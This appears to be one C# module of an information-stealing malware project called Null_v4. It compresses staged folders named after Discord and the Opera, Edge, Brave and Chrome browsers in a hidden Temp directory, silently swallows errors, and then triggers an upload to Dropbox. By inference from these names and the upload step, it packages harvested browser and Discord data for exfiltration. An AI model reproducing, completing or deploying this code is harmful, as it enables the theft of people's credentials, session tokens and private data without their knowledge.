using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;

namespace Null_v4
{
    static class ZIPManager
    {
        public static void ZIPTrigger()
        {
            ZIPFiles();
        }

        private static void ZIPFiles()
        {
            //Discord
            var userLocalDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var userRoamingDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            var DiscordArchievePath = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Discord.zip";
            string DiscordDestination = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Discord\";

            try
            {
                if (!System.IO.File.Exists(DiscordArchievePath))
                {
                    System.IO.Compression.ZipFile.CreateFromDirectory(DiscordDestination, DiscordArchievePath);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }



            //Opera
            var OperaArchievePath = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Opera.zip";
            string OperaDestination = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Opera\";

            try
            {
                if (!System.IO.File.Exists(OperaArchievePath))
                {
                    System.IO.Compression.ZipFile.CreateFromDirectory(OperaDestination, OperaArchievePath);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }



            //Edge
            var EdgeArchievePath = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Edge.zip";
            string EdgeDestination = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Edge\";

            try
            {
                if (!System.IO.File.Exists(EdgeArchievePath))
                {
                    System.IO.Compression.ZipFile.CreateFromDirectory(EdgeDestination, EdgeArchievePath);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }



            //Brave
            var BraveArchievePath = userLocalDir + @"\Temp\"+ Null_v4.Library.Global_Main_Dir_Name + @"\Brave.zip";
            string BraveDestination = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Brave\";

            try
            {
                if (!System.IO.File.Exists(BraveArchievePath))
                {
                    System.IO.Compression.ZipFile.CreateFromDirectory(BraveDestination, BraveArchievePath);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }



            //Chrome
            var ChromeArchievePath = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Chrome.zip";
            string ChromeDestination = userLocalDir + @"\Temp\" + Null_v4.Library.Global_Main_Dir_Name + @"\Chrome\";

            try
            {
                if (!System.IO.File.Exists(ChromeArchievePath))
                {
                    System.IO.Compression.ZipFile.CreateFromDirectory(ChromeDestination, ChromeArchievePath);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }

            UploadManager.TriggerDropbox();
        }
    }
}
